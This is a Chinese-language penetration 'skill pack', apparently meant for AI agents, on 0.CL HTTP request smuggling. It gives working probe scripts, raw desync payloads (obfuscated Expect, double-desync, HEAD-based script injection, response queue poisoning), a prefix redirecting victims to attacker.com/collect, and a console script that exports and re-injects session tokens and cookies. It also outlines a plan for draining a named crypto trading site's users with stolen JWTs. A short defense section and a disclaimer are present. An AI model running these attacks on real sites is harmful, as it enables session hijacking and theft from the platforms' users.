---
name: "0.CL HTTP Request Smuggling - 全栈渗透技能"
description: "从漏洞探测到身份克隆的完整 0.CL HTTP 请求走私攻击与防御技能包。包含 Python 探测脚本、多阶段验证方法论、身份注入脚本、针对 Web3/区块链交易平台的专项攻击链分析，以及基于 James Kettle 2025 'HTTP/1 Must Die' 研究的最新前沿技术：Expect-based 攻击、Double-desync (0.CL→CL.0)、Response Queue Poisoning (RQP)、Pause-based desync 和 HTTP Trailers 走私。"
---

# 0.CL HTTP Request Smuggling - 全栈渗透技能

> **Arsenal Standard v2** | 重构于 2026-03-07
> 本技能包已按三层架构标准整理。新 Agent 请先阅读下方导航索引。

## 📋 技能概览

**0.CL 请求走私 (Zero Content-Length Request Smuggling)** 是一种利用前端代理（如 Cloudflare）与后端服务器（如 Nginx/Envoy）对 `Content-Length` 头部处理不一致而产生的 HTTP 去同步化 (Desynchronization) 漏洞。

**核心原理**：当前端代理认为 GET 请求不应该有 Body（忽略 CL），而后端服务器却尊重 CL 并等待 Body 数据时，攻击者可以在两者之间的"认知差"中注入恶意请求前缀，从而劫持下一个用户的合法请求。

**危险等级**：🔴 Critical（尤其针对加密货币/金融交易平台）

---

## 🗺️ 技能包导航索引 (Arsenal Standard v2)

```
http-request-smuggling-0cl/
├── SKILL.md              ← 你在这里 (核心文档 + 快速入门)
├── .gitignore            ← 排除编译产物/缓存/日志
│
├── docs/                 📚 专题文档
│   ├── 00_recon_protocol.md    侦察协议 SOP
│   ├── 01_weapon_arsenal.md    武器库速查手册
│   ├── 02_waf_bypass.md        WAF 绕过与已知限制
│   └── 03_red_blue_2026.md     2026 红蓝对抗态势分析
│
├── scripts/              🔧 通用检测脚本
│   ├── rqp_collider.py         RQP 碰撞器
│   ├── verify_0cl.py           0.CL 验证脚本
│   ├── curl_impersonate/       Shell 绕过脚本 (3个)
│   └── turbo_intruder/         Burp Suite 专用 (2个)
│
├── weapons/graviton/     ⚔️ Project Graviton 精锐武器库
│   ├── cmd/                    Go 工具集 (仅终版)
│   │   ├── cache_venom/        🏆 CF 边缘缓存投毒引擎
│   │   ├── ghost_nail_v4.1/    🏆 [2026] 终极审计修复版: 0.CL/RQP 验伪引擎 (支持 H2, Trailers, Expect 混淆)
│   │   └── diag/               🔧 H2 帧级诊断工具
│   ├── recon/                  Python 侦察三叉戟
│   │   ├── track_alpha_ws.py   WebSocket 升级旁路探针
│   │   ├── track_bravo_origin.py  Origin IP 猎手
│   │   └── track_delta_expect.py  Expect 100-Continue 盲探
│   └── exploit/                最终 Exploit PoC
│       ├── csd_csrf_poc.html   CSD 盲打 CSRF 套件
│       └── csd_reproduction_poc.html  白皮书级复现 PoC
│
├── lab/                  🧪 靶场基础设施 (Docker)
│   ├── docker-compose.yml      一键启动靶场
│   ├── backend/                Node.js 脆弱后端
│   ├── envoy/                  Envoy 前端代理
│   ├── nginx/                  Nginx 前端代理
│   └── victim/                 流量生成器
│
├── history/              📁 战役归档 (只增不改)
│   └── gmgn_ai_2026_03_06/    gmgn.ai 实战记录
│
└── archive/              🗄️ 已废弃工具 (历史参考)
    └── graviton_legacy/        8个早期迭代版本
```

### ⚡ 快速入门 (5 分钟)

1. **阅读本文档** — 理解 0.CL 原理和攻击链
2. **部署靶场** — `cd lab/ && docker-compose up -d`
3. **运行验证** — `python scripts/verify_0cl.py --target localhost:8080`
4. **编译武器** — `cd weapons/graviton && go build ./cmd/cache_venom`
5. **深入专题** — 阅读 `docs/` 下的专题文档

---

## 🔬 Phase 1: 漏洞探测 (Probing)

### 1.1 初始指纹探测脚本

**目标**：确认后端是否会对 GET 请求的 `Content-Length` 做出响应。

```python
#!/usr/bin/env python3
"""
0.CL Request Smuggling - Initial Probe
目标：检测后端是否对 GET 请求的 CL 头部做出异常响应
关键指标：收到 "100 Continue" 表示后端正在等待 Body
"""
import socket, ssl, time, sys

TARGET_HOST = "TARGET_DOMAIN"  # 替换为目标域名
TARGET_PORT = 443
TIMEOUT = 10

def probe_100_continue(host):
    """Phase A: 发送带有 Expect: 100-continue 的 GET 请求"""
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 100\r\n"
        f"Expect: 100-continue\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(TIMEOUT)
    conn = ctx.wrap_socket(raw, server_hostname=host)
    
    try:
        conn.connect((host, TARGET_PORT))
        t0 = time.time()
        conn.sendall(payload.encode())
        
        data = b""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                # 收到足够数据后停止
                if b"HTTP/1.1" in data and len(data) > 50:
                    break
        except socket.timeout:
            pass
        
        elapsed = time.time() - t0
        response = data.decode(errors='replace')
        
        if "100 Continue" in response:
            print(f"[!] VULNERABLE: 收到 100 Continue (耗时 {elapsed:.2f}s)")
            print(f"    后端正在等待不存在的 Body 数据！")
            return True, elapsed, response
        elif "200 OK" in response or "301" in response or "302" in response:
            print(f"[*] 正常响应 (耗时 {elapsed:.2f}s)")
            return False, elapsed, response
        else:
            print(f"[?] 未知响应 (耗时 {elapsed:.2f}s)")
            return False, elapsed, response
    finally:
        conn.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    print(f"=== 0.CL Smuggling Probe: {host} ===")
    probe_100_continue(host)
```

### 1.2 判定标准

| 响应类型 | 含义 | 漏洞判定 |
|:---|:---|:---|
| `100 Continue` | 后端正在等待 Body | ✅ 高度可疑 |
| 立即返回 `200/301/302` | 前端/后端忽略了 CL | ❌ 安全 |
| 立即返回 `400/403` | 前端 WAF 拦截 | ❌ 安全 |
| 连接挂起 5+ 秒 | 后端在等待 Body 但没发 100 | ✅ 确认漏洞 |

---

## 🔬 Phase 2: 深度验证 (Deep Verification)

### 2.1 多阶段验证套件

```python
#!/usr/bin/env python3
"""
0.CL Request Smuggling - Deep Verification Suite v4.0
多阶段验证：时间差分析 + 连接复用 + 架构指纹
"""
import socket, ssl, time, sys

TARGET_HOST = "TARGET_DOMAIN"
LOG_FILE = "deep_verify.log"

def create_ssl_conn(host, timeout=10):
    ctx = ssl.create_default_context()
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    conn = ctx.wrap_socket(raw, server_hostname=host)
    conn.connect((host, 443))
    return conn

def phase_a_100_continue(host):
    """Phase A: 100 Continue 指纹确认"""
    print("[Phase A] 100 Continue Fingerprint...")
    payload = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 100\r\nExpect: 100-continue\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    conn = create_ssl_conn(host)
    try:
        t0 = time.time()
        conn.sendall(payload.encode())
        data = conn.recv(4096)
        elapsed = time.time() - t0
        resp = data.decode(errors='replace')
        vulnerable = "100 Continue" in resp
        return {"phase": "A", "vulnerable": vulnerable, 
                "time": elapsed, "indicator": "100 Continue" if vulnerable else "Normal"}
    except socket.timeout:
        return {"phase": "A", "vulnerable": False, "time": 10, "indicator": "Timeout"}
    finally:
        conn.close()

def phase_b_blind_wait(host):
    """Phase B: 盲等待计时 - 发送 CL:100 但不发 Body，观察挂起时间"""
    print("[Phase B] Blind-Wait Timing...")
    payload = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 100\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    conn = create_ssl_conn(host, timeout=6)
    try:
        t0 = time.time()
        conn.sendall(payload.encode())
        data = conn.recv(4096)
        elapsed = time.time() - t0
        # 如果响应很快返回，说明后端忽略了 CL（安全）
        # 如果挂起接近 timeout，说明后端在等 Body（漏洞）
        vulnerable = elapsed > 4.0
        return {"phase": "B", "vulnerable": vulnerable,
                "time": elapsed, "indicator": f"Hang {elapsed:.2f}s" if vulnerable else "Quick response"}
    except socket.timeout:
        elapsed = time.time() - t0
        return {"phase": "B", "vulnerable": True, 
                "time": elapsed, "indicator": f"Full timeout {elapsed:.2f}s - backend waiting for body"}
    finally:
        conn.close()

def phase_c_differential(host):
    """Phase C: 差分计时 - 比较 CL:0 vs CL:200 的响应时间差"""
    print("[Phase C] Differential Timing...")
    results = {}
    for cl_val in [0, 200]:
        payload = (
            f"GET / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        conn = create_ssl_conn(host, timeout=6)
        try:
            t0 = time.time()
            conn.sendall(payload.encode())
            try:
                conn.recv(4096)
            except socket.timeout:
                pass
            results[cl_val] = time.time() - t0
        finally:
            conn.close()
    
    diff = abs(results.get(200, 0) - results.get(0, 0))
    vulnerable = diff > 3.0
    return {"phase": "C", "vulnerable": vulnerable,
            "time": diff, "indicator": f"CL:0={results.get(0,0):.2f}s, CL:200={results.get(200,0):.2f}s, Δ={diff:.2f}s"}

def phase_e_architecture(host):
    """Phase E: 架构指纹识别"""
    print("[Phase E] Architecture Fingerprint...")
    payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    conn = create_ssl_conn(host)
    try:
        conn.sendall(payload.encode())
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 8192:
                break
        resp = data.decode(errors='replace')
        
        arch = []
        if "cloudflare" in resp.lower():
            arch.append("Cloudflare")
        if "envoy" in resp.lower() or "x-envoy" in resp.lower():
            arch.append("Envoy")
        if "nginx" in resp.lower():
            arch.append("Nginx")
        
        headers = {}
        for line in resp.split('\r\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip().lower()] = v.strip()
        
        return {"phase": "E", "arch": " -> ".join(arch) if arch else "Unknown",
                "headers": headers, "proxy_chain": arch}
    finally:
        conn.close()

def run_full_suite(host):
    """执行完整验证套件"""
    print(f"\n{'='*60}")
    print(f"  0.CL HTTP Request Smuggling - Deep Verification Suite v4.0")
    print(f"  Target: {host}")
    print(f"{'='*60}\n")
    
    results = []
    results.append(phase_a_100_continue(host))
    results.append(phase_b_blind_wait(host))
    results.append(phase_c_differential(host))
    arch = phase_e_architecture(host)
    
    # 综合判定
    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    
    print(f"\n{'='*60}")
    print(f"  VERDICT")
    print(f"{'='*60}")
    for r in results:
        status = "🔴 VULNERABLE" if r.get("vulnerable") else "🟢 SAFE"
        print(f"  Phase {r['phase']}: {status} - {r['indicator']}")
    print(f"  Architecture: {arch['arch']}")
    
    if vuln_count >= 2:
        print(f"\n  ⚠️  CONFIRMED VULNERABLE (Score: {vuln_count}/3)")
    elif vuln_count == 1:
        print(f"\n  ⚡ POSSIBLY VULNERABLE (Score: {vuln_count}/3)")
    else:
        print(f"\n  ✅ LIKELY SAFE (Score: {vuln_count}/3)")
    
    return results, arch

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    run_full_suite(host)
```

### 2.2 验证矩阵判定标准

| Phase A (100 Continue) | Phase B (Blind Wait) | Phase C (Differential) | 最终判定 |
|:---|:---|:---|:---|
| ✅ 收到 100 | ✅ 挂起 >4s | ✅ Δ >3s | 🔴 **确认漏洞** |
| ✅ 收到 100 | ✅ 挂起 >4s | ❌ 差异小 | 🟡 高度可疑 |
| ❌ 无 100 | ✅ 挂起 >4s | ✅ Δ >3s | 🟡 后端待验证 |
| ❌ 无 100 | ❌ 快速响应 | ❌ 差异小 | 🟢 基本安全 |

---

## 🏗️ Phase 3: 架构分析 (Architecture Fingerprinting)

### 3.1 常见漏洞架构模式

```
[高危] Cloudflare (H2) → Envoy (H1.1) → Backend
[高危] Cloudflare (H2) → Nginx (H1.1) → Backend  
[中危] AWS ALB (H2)    → Nginx (H1.1) → Backend
[低危] 纯 Nginx 单层架构
```

### 3.2 关键响应头指纹

| 响应头 | 归属 | 含义 |
|:---|:---|:---|
| `server: cloudflare` | Cloudflare 边缘 | 请求经过 CF 代理 |
| `x-envoy-upstream-service-time` | Envoy 网关 | 请求穿透了 CF 到达 Envoy |
| `cf-ray` | Cloudflare | CF 请求追踪 ID |
| `x-request-id` | 后端服务 | 请求到达了最终后端 |

### 3.3 如何判断请求是否穿透了 CF？

**核心判据**：如果响应中同时包含 `server: cloudflare` 和 `x-envoy-upstream-service-time`，证明请求已经穿透 CF 边缘到达了后端 Envoy。如果 CL 异常请求也能触发这些头部 + 秒级延迟，则确认走私窗口存在。

---

## 💀 Phase 4: 利用链分析 (Exploitation Chain)

### 4.1 响应队列投毒 (Response Queue Poisoning)

这是 0.CL 走私的经典利用方式：

```
攻击者发送:
┌─────────────────────────────────────┐
│ GET / HTTP/1.1                      │
│ Host: target.com                    │
│ Content-Length: 45                   │  ← 前端忽略，后端等待 45 字节
│                                     │
│ GET /api/v1/user HTTP/1.1           │  ← 这 45 字节成为"走私前缀"
│ Host: target.com                    │
│                                     │
└─────────────────────────────────────┘

受害者紧接着发送:
┌─────────────────────────────────────┐
│ GET /portfolio HTTP/1.1             │
│ Host: target.com                    │
│ Authorization: Bearer eyJhbG...     │  ← 受害者的真实令牌
│ Cookie: sid=gmgn|abc123             │
└─────────────────────────────────────┘

后端看到的:
请求1: GET / (攻击者的正常请求)
请求2: GET /api/v1/user + 受害者的 Headers  ← 受害者的令牌被拼接到攻击者控制的请求中！
```

### 4.2 针对 Web3 交易平台的攻击链 (实战案例: gmgn.ai)

```
Step 1: 黑客利用 0.CL 走私截获受害者的 Bearer Token
         ↓
Step 2: 黑客拿到 access_token (JWT) 
         - 格式: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...
         ↓
Step 3: 黑客无法直接提现（需要 2FA 验证）
         ↓
Step 4: 黑客在 SOL 链上部署"貔貅合约"（只能买入不能卖出）
         ↓
Step 5: 黑客用受害者的 Token 调用交易 API 买入空气币
         - POST /tapi/v1/trade/buy
         - Authorization: Bearer <受害者的Token>
         - 交易操作不需要 2FA！
         ↓
Step 6: 空气币池子里的 SOL 被黑客从另一端抽走
         ↓
Step 7: 受害者账户只剩下价值归零的垃圾代币
```

---

## 🔑 Phase 5: 身份克隆与注入 (Identity Cloning)

### 5.1 现代 Web3 站点的认证架构

**重要发现**：现代加密货币交易平台（如 gmgn.ai）的认证**不完全依赖 Cookie**。

```
认证数据分布:
┌─────────────────────────────────────────────┐
│ Cookie (sid)          → 基础会话标识          │  ← 单独注入无法登录
│ LocalStorage:                                │
│   ├─ tgInfo.token.access_token  → JWT 令牌   │  ← 核心认证凭证
│   ├─ tgInfo.token.refresh_token → 刷新令牌   │  ← 长期有效
│   ├─ accountInfo     → 账户配置              │
│   ├─ userInfo        → 用户画像              │
│   ├─ wagmi.store     → 钱包连接状态          │
│   ├─ key_device_id   → 设备指纹 ID           │
│   └─ key_fp_did      → 浏览器指纹            │
└─────────────────────────────────────────────┘
```

### 5.2 全量身份导出脚本 (在已登录浏览器中运行)

```javascript
(function(){
    const data = {
        ls: localStorage,
        ck: document.cookie
    };
    delete data.ls['mainControllerHeartbeat'];
    
    const output = `
/* --- 权限注入脚本 (JSON 安全模式) --- */
const injectData = ${JSON.stringify(data)};
Object.keys(injectData.ls).forEach(key => localStorage.setItem(key, injectData.ls[key]));
injectData.ck.split(';').forEach(cookie => {
    document.cookie = cookie.trim() + "; domain=.TARGET_DOMAIN; path=/";
});
location.reload();
    `;
    console.log(output);
    copy(output);
    alert("注入代码已复制到剪贴板！");
})();
```

### 5.3 注入目标环境

**方法 A: 指纹浏览器 (AdsPower / BitBrowser)**
1. 在指纹浏览器中打开目标站点 (未登录)
2. 按 F12 → Console
3. 粘贴并执行导出的注入脚本
4. 页面刷新后即进入登录态

**方法 B: Yakit MITM 代理**
1. Yakit 开启 MITM 代理 (默认端口 8083)
2. 目标浏览器设置代理为 127.0.0.1:8083
3. 在 Yakit 拦截面板中，替换请求的 Authorization 和 Cookie 头部
4. 放行请求后目标浏览器即获得登录态

**方法 C: cURL 直接 API 调用 (无需浏览器)**
```bash
curl -X GET "https://TARGET_DOMAIN/tapi/v1/wallet/assets" \
  -H "Authorization: Bearer eyJhbGci..." \
  -H "Cookie: sid=gmgn|abc123"
```

---

## 🛡️ Phase 6: 防御与缓解 (Defense & Mitigation)

### 6.1 服务端修复

```nginx
# Nginx: 拒绝 GET 请求携带 Content-Length
if ($request_method = GET) {
    set $invalid_cl 0;
}
if ($http_content_length != "") {
    set $invalid_cl "${invalid_cl}1";
}
if ($invalid_cl = "01") {
    return 400;
}
```

### 6.2 架构层面加固

1. **统一协议版本**：确保前端代理和后端服务器使用相同的 HTTP 版本
2. **严格 CL 校验**：在反向代理层丢弃 GET/HEAD 请求中的 Content-Length
3. **Connection: close**：对非持久连接请求强制断开，减少管道复用风险
4. **部署 HTTP/2 端到端**：避免 H2→H1.1 协议降级带来的语义差异

### 6.3 用户自保措施

1. **使用硬件钱包签名**：每次交易都需要物理确认，走私无法劫持硬件签名
2. **设置严格的滑点限制**：防止黑客利用极差流动性的空气币一次性清空资产
3. **启用交易密码/PIN**：在买入操作前增加独立密码确认
4. **频繁刷新登录态**：定期登出再登入，缩短 Token 有效窗口

---

## 📊 实战案例: gmgn.ai 专项审计 (2026-03-04 ~ 03-06)

针对 gmgn.ai 的审计是 0.CL 走私在**现代 CDN 强防御环境**下的典型对战案例。该案例标志着攻击者必须从单纯的协议利用转向**“全协议栈模拟”**与**“链路完整性穿透”**的对抗。

### 🕒 审计历程与核心结论
*   **初步发现**：确认后端存在 0.CL 缺陷，会错误挂起等待 GET Body。
*   **防御遭遇**：遭遇 Cloudflare 的 JA3 指纹封锁与 GET Body 物理清洗。
*   **特种绕过**：采用 `curl-impersonate` (Chrome 116) 穿透 TLS 封锁。
*   **最终判定**：**受限于边缘节点清洗，理论存在但物理不可利用。**

### 📂 战史馆归档 (War Room Archives)
详细的实验脚本、Raw 数据与日志已归档至本地资产库：
🔗 **[gmgn_ai_2026_03_06 专项归档](./history/gmgn_ai_2026_03_06/session_summary.md)**

**归档内容包含：**
- `scripts/`: RQP 验证脚本、TLS 指纹模拟器、WAF 绕过探针。
- `evidence/`: 20轮并发碰撞测试 Raw 数据、TLS/Auth 拦截指纹快照。
- `session_summary.md`: 深度架构复盘与“物理免疫”理论判定。

🔗 **进阶阅读与终局绕过推演**：
- [WAF_BYPASS_AND_LIMITATIONS.md](./WAF_BYPASS_AND_LIMITATIONS.md) (Cloudflare 物理级免疫机制与测试脚本)
- 🏆 **[RED_BLUE_CONFRONTATION_2026.md](./RED_BLUE_CONFRONTATION_2026.md) (顶级红蓝对抗沙盘实录：Pause / Jitter Padding / Identity Injection 架构级破壁方案)**
- `scripts/advanced_bypass/` 目录包含基于 curl-impersonate 的高维绕过验证器。

---

## 🆕 Phase 7: Expect-Based 0.CL 攻击 (2025 Kettle 最新研究)

> **来源**: James Kettle, "HTTP/1.1 must die: the desync endgame" (2025)
> **总赏金**: $350,000+ | **影响案例**: T-Mobile ($12K), GitLab ($7K), Akamai CDN ($221K)

### 7.1 核心突破: Expect 是天然的 Early-Response Gadget

**0.CL 攻击的经典死锁问题**：
```
前端不看 CL → 只转发 headers → 等后端响应
后端看 CL   → 等待 body 到达 → 等前端发送
双方互等 → 超时 → 攻击失败
```

**解决方案**: `Expect: 100-continue` 让后端在等待 body 之前就发送响应！

```
GET /path HTTP/1.1
Host: target.com
Content-Length: 291
Expect: 100-continue    ← 后端返回 100 Continue 后，保持连接开放

[走私前缀留在后端连接缓冲区中]
```

### 7.2 Vanilla Expect 攻击 (T-Mobile 案例, $12,000)

```
# 第一个请求: 触发 0.CL desync
GET /logout HTTP/1.1
Host: <target>
Expect: 100-continue
Content-Length: 291

# 第二个请求: double-desync 转 CL.0
GET /logout HTTP/1.1
Host: <target>
Content-Length: 100

GET / HTTP/1.1
Host: <target>
GET https://attacker.com/collect HTTP/1.1
X: y
```

**结果**: 受害者的响应变成 `301 → Location: https://attacker.com/...`

### 7.3 混淆 Expect 攻击 (GitLab 案例, $7,000)

当 vanilla Expect 被 WAF 拦截时，使用混淆值：

```
# 混淆变体 (绕过 WAF):
Expect: y 100-continue       ← GitLab 上有效
Expect: 100-Continue         ← 大小写变体
Expect: 100 continue         ← 缺少连字符
Expect: x, 100-continue      ← 多值变体
```

**GitLab 实战**: 在 h1.sec.gitlab.net 上，27,000 次请求后成功执行 RQP，获取到员工的漏洞报告视频。

### 7.4 CDN 级 Expect CL.0 (Akamai 案例, CVE-2025-32094, $221K)

```
OPTIONS /anything HTTP/1.1
Host: auth.lastpass.com
Expect: 100-continue
Content-Length: 39

GET / HTTP/1.1
Host: www.sky.com
X: X
```

**影响**: Akamai CDN 上的所有站点（可能包括 example.com），产出 74 个赏金报告共 $221,000。

---

## 🔄 Phase 8: Double-Desync (0.CL → CL.0 转换)

### 8.1 核心原理

0.CL 本身只能让前缀"留在"连接中，但无法直接控制对受害者的攻击内容。Double-desync 通过两阶段攻击解决此问题：

```
Stage 1 (0.CL): POST /gadget + CL:N + Expect
  → 后端提前响应，走私前缀留在连接

Stage 2 (CL.0 转换): 走私前缀武器化第二个请求
  → 第二个请求的 body 成为对受害者的恶意前缀

Stage 3 (受害者): 受害者请求被拼接
  → 攻击者完全控制的前缀 + 受害者的真实请求
```

### 8.2 使用 Turbo Intruder 计算偏移量

```python
# 0cl-find-offset.py (Turbo Intruder 脚本)
# 自动发现前端注入的额外 header 长度

# 关键: 大多数前端在 header block 尾部追加头部
# 所以走私前缀从 header 开头开始 → 攻击可靠地工作

POST /nul HTTP/1.1
Content-length: 44

# 走私前缀:
GET /aa HTTP/1.1
Content-Length: 150
Foo:

# 被前端追加的头部会落在这里
# → 偏移量由 0cl-find-offset.py 自动计算
```

### 8.3 HEAD 技术: 向受害者投送恶意 JavaScript

```
POST /nul HTTP/1.1
Host: <target>
Content-length: 44

GET /aa HTTP/1.1
Content-Length: 150
Foo:

GET /bb HTTP/1.1
Host: <target>
HEAD /index.asp HTTP/1.1
Host: <target>

GET /?<script>alert(1) HTTP/1.1
X: Y
```

**效果**: 受害者收到一个 200 响应，其 Content-Length 来自 HEAD 响应（很大），但实际 body 包含攻击者注入的 `<script>` 标签。

---

## ☠️ Phase 9: Response Queue Poisoning (RQP) — 解决数据泄出瓶颈

### 9.1 核心原理

RQP 是解决 "攻击者如何看到受害者数据" 问题的最优方案：

```
正常:  用户A 请求 → 响应A → 返回给 A
       用户B 请求 → 响应B → 返回给 B

RQP 攻击后:
       攻击者走私 → 后端以为收到 2 个请求 → 产出 2 个响应 → 队列错位
       
       攻击者收到 → 本该给其他用户的响应 (含用户数据!)
       其他用户收到 → 攻击者的某个响应 (错位显示)
```

### 9.2 RQP 实战载荷 (基于 GitLab 案例)

```
# 走私请求 (通过 Expect 混淆触发 0.CL)
GET / HTTP/1.1
Content-Length: 686
Expect: y 100-continue

# 走私前缀 (double-desync)
GET / HTTP/1.1
Content-Length: 292

GET / HTTP/1.1
Host: <target>

GET / HTTP/1.1
Host: <target>
```

**攻击者接下来发送正常请求**：收到的响应实际上是其他用户的请求响应！

### 9.3 实战对战记录 (gmgn.ai)
详见 **[gmgn_ai_2026_03_06 专项归档](./history/gmgn_ai_2026_03_06/session_summary.md)** 中的 RQP 碰撞日志。
结论：Cloudflare 成功阻断了所有跨连接响应注入。

---

## ⏸️ Phase 10: Pause-Based Desync (暂停走私)

> **来源**: Turbo Intruder `pauseMarker` 功能 (2025年12月)

### 10.1 原理

通过在 HTTP 请求发送过程中人为制造 TCP 暂停，诱导前后端对请求边界的理解产生分歧：

```python
# Turbo Intruder 配置:
pauseMarker = "\\r\\n\\r\\n"  # 在 header 结束后暂停
pauseTime = 5000            # 暂停 5 秒

# 效果: 前端以为请求结束 → 转发给后端
#       暂停恢复后的后续数据 → 被后端当作新请求
```

### 10.2 应用场景

当 Expect 头被 WAF 拦截时，pause-based desync 是备选方案。它不依赖任何特殊头部，仅利用 TCP 层的时间差。

---

## 🔗 Phase 11: HTTP Trailers 走私 (2026 新向量)

> **来源**: sebsrt 研究, 2026年2月; James Kettle 推荐

### 11.1 原理

HTTP Trailers (RFC 7230) 允许在分块传输结尾处追加额外头部。当前后端对 Trailer 字段的处理不一致时，可实现走私：

```
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Trailer: Content-Length

5
hello
0
Content-Length: 50    ← Trailer 头部，某些后端会当作下一个请求的头

GET /smuggled HTTP/1.1
Host: target.com
```

### 11.2 优势

- 大部分 WAF **不检测** Trailer 字段
- 绕过了传统的 CL.TE / TE.CL 检测规则
- 与 0.CL 可组合使用

---

## 📚 行业最新参考案例 (2025-2026)

| 目标 | 类型 | 赏金 | 技术 |
|:---|:---|:---|:---|
| Cloudflare (内部) | H2.0 desync | $7,000 | 内部 H1.1 降级走私，影响 24M 网站 |
| T-Mobile | 0.CL via Expect | $12,000 | Vanilla Expect gadget |
| GitLab h1.sec | 0.CL via obfuscated Expect | $7,000 | `Expect: y 100-continue` + RQP |
| Akamai CDN | CL.0 via obfuscated Expect | $221,000 (74 reports) | CVE-2025-32094 |
| Netlify CDN | CL.0 via Expect | (ignored) | RQP 跨站点 Token 泄露 |
| LastPass (via Akamai) | CL.0 | $5,000 | OPTIONS + Expect |
| EXNESS | 0.CL | $7,500 | Double-desync |
| Kestrel (ASP.NET) | TE smuggling | CVE-2025-55315 (CVSS 9.9) | 分块传输处理缺陷 |
| GCP Vertex AI | Expect RQP | - | LLM 响应跨用户泄露 |
| h3 framework | TE.TE | CVE-2026-23527 | 大小写不敏感 TE 走私 |
| **gmgn.ai** | **0.CL** | **-** | **后端存在理论缺陷但被 Cloudflare Edge 物理清洗阻断** |

---

## 🔧 工具链

| 工具 | 用途 | 状态 |
|:---|:---|:---|
| Python socket + ssl | 底层协议级探测脚本 | ✅ 已使用 |
| Yakit MITM | 流量拦截、请求重放、头部替换 | ✅ 可用 |
| AdsPower / BitBrowser | 指纹浏览器环境克隆 | ✅ 已验证 |
| Browser DevTools (F12) | LocalStorage 提取、Network 流量分析 | ✅ 已使用 |
| cURL / Postman | API 级别的令牌利用验证 | ✅ 可用 |
| **Burp Suite + Turbo Intruder** | **RQP 自动化、pauseMarker、0cl-find-offset** | 🆕 推荐 |
| **HTTP Request Smuggler v3.0** | **Parser 差异自动检测 (V-H / H-V)** | 🆕 推荐 |
| **Turbo Intruder pauseMarker** | **Pause-based desync 专用** | 🆕 推荐 |
| **Repeater "Retry until success"** | **概率性漏洞持续重试** | 🆕 推荐 |

---

---

## 🚀 Phase 12: 0.CL Endgame & H2 Persistence (2026 核心演进)

> **核心成果来自于 2026-03-07 gmgn.ai 专项实战，基于 James Kettle 'HTTP/1 Must Die' 深度审计修复。**

### 12.1 0.CL 死锁破解：Early-Response 判定模型
0.CL 攻击最大的障碍是后端“死等”Body 导致的超时。成功的关键在于找到 **Early-Response Gadget**：

- **判定标准**：发送 `HEADERS` (含恶意 CL) 后，**故意不发送 DATA (Body)**，并监听 4s 窗口。
- **Gadget 发现**：如果收到任何响应（如 100, 200, 302），说明后端已打开“走私窗口”，由于 Body 尚未发送，载荷将残留在后端 TCP 缓冲区。
- **实战利器**：`ghost_nail_v4.1` 具备自动化 early-response 监听能力。

### 12.2 OPTIONS 方法的战略地位
在 2026 年的实战中，`GET` 的 Body 常常被 WAF 物理移除。
- **Kettle 策略**：当 `GET` 被洗时，切换为 `OPTIONS` 方法探测。
- **原理**：`OPTIONS` 给后端的印象通常是无害的（Pre-flight），后端更倾向于快速响应而忽略读取 Body，从而创造 0.CL/CL.0 窗口。

### 12.3 链路分层：Edge vs Origin Gadget
并非所有走私都是有价值的，必须区分载荷残留的位置：
- **Edge Gadget (CSD)**：典型如 `/cdn-cgi/trace`。载荷残留在 `User <-> CDN` 链路，用于劫持自己的 Session 或 XSS。
- **Origin Gadget (RQP)**：载荷残留在 `CDN <-> Origin` 链路。用于大规模 **Response Queue Poisoning**，劫持他人 JWT。

### 12.4 渗透工具工程化：H2 状态持久化
在开发 Go 语言渗透工具（如 Graviton 系列）时，必须注意：
- **HPACK Decoder 必须持久化**：Decoder 内置动态表（Dynamic Table），如果每帧重置，会导致解析后续 Header 时出现 `decompression error`。
- **StreamID 管理**：H2 请求必须严格遵守 Client 使用奇数 ID 的规则（S1, S3, S5...），否则会被后端强制 RST。

---

## 🛠️ 推荐武库 (Recommended Weapons)

- **Ghost Nail v4.1 (Post-Audit Build)**: 支持 H2 Trailers, 6 种混淆 Expect 变体, GET/OPTIONS/POST 组合扫描, 自动区分 Edge/Origin 流量特性。
- **Track Bravo Origin**: 必不可少的配套工具，用于发现 WAF 背后的真实 IP，是所有 0.CL 向量生效的前提。

---

## ⚠️ 免责声明

本技能仅用于**授权渗透测试**和**安全研究**目的。未经授权对他人系统进行测试属于违法行为。使用者需自行承担法律责任。
